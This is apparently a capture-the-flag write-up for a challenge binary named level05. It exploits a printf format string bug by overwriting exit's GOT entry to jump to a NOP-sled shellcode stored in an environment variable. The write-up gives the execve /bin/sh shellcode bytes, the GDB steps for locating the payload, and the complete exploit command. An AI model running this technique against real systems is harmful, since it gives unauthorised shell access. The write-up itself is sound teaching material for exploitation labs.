1. We discovered that the binary's printf function, which uses stdin as the format string, is vulnerable to a format string attack.
2. The program converts the buffer to lowercase before executing printf, making it difficult for a buffer overflow to corrupt a shellcode.
3. Instead of ending the main function with a return statement, it uses the exit function. Since the Global Offset Table (GOT) is writable, we decided to overwrite the resolved address of exit with an address on the stack.
4. Another method to insert data into the binary is by using environment variables.
   a. We chose the following shellcode: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80.
   b. We created an environment variable with the following command: export EGG=$(perl -e 'print "\x90"x1024 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"').
5. We also constructed a printf format string attack, where the Xs represent the decimal value of the target address to redirect the execution flow to:
   perl -e 'print "\xe0\x97\x04\x08" . "\xe2\x97\x04\x08" . "%XXXXx" . "%10\$hn" . "%XXXx" . "%11\$hn"'
6. To find the address of the environment variable:
   a. We opened GDB: gdb ./level05.
   b. Set a breakpoint: b *main+200.
   c. Ran the program: r <<< $(perl -e 'print "HELLO"').
   d. Printed the environment variables as hexadecimal: x/200x environ.
   e. We identified the NOPs and selected an address in the middle: FFFFD77C.
7. Finally, here is the command to execute the exploit (ensure that the environment variable is correctly set):
   (perl -e 'print "\xe0\x97\x04\x08" . "\xe2\x97\x04\x08" . "%55156x" . "%10\$hn" . "%10371x" . "%11\$hn"'; cat) | ~/level05
